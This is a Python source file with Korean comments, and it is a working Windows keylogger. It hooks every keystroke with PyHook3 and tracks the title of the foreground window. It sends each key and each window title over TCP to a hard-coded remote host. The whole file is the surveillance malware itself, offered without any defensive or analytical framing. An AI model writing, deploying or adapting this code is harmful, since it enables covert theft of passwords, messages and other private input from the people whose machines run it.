import win32gui                                                # 현재 창 정보 얻기 모듈
import pythoncom, PyHook3
from socket import *
from select import *
import sys

# 접속 정보 설정 (호스트, 포트와 버퍼 사이즈를 지정)
HOST = '192.168.0.18'
PORT = 13389
BUFSIZE = 1024
ADDR = (HOST,PORT)

curWindow = None
def getCurProc():
    global curWindow
    try:
        hwnd = win32gui.GetForegroundWindow()                 # 가장 상위 윈도우 핸들 가져오기
        winTitle = win32gui.GetWindowText(hwnd)               # 핸들을 입력받아 윈도우의 이름을 가져오기
        if winTitle != curWindow:
            curWindow = winTitle
            clientSocket = socket(AF_INET, SOCK_STREAM)
            clientSocket.connect(ADDR)
            clientSocket.send(winTitle.encode())
    except:
        clientSocket.send("[Unknown Window]".encode())
        pass
  
def OnKeyboardEvent(event):
    getCurProc()
    clientSocket = socket(AF_INET, SOCK_STREAM)              # 소켓 생성
    clientSocket.connect(ADDR)                               # 서버에 접속
    clientSocket.send(event.Key.encode())                    # 서버에 메시지 전송
    return True

def main():
    hm = PyHook3.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

while True:

    try:
        if __name__ == '__main__':
            main()

    except  Exception as e:
        print('%s:%s'%ADDR)
        sys.exit()
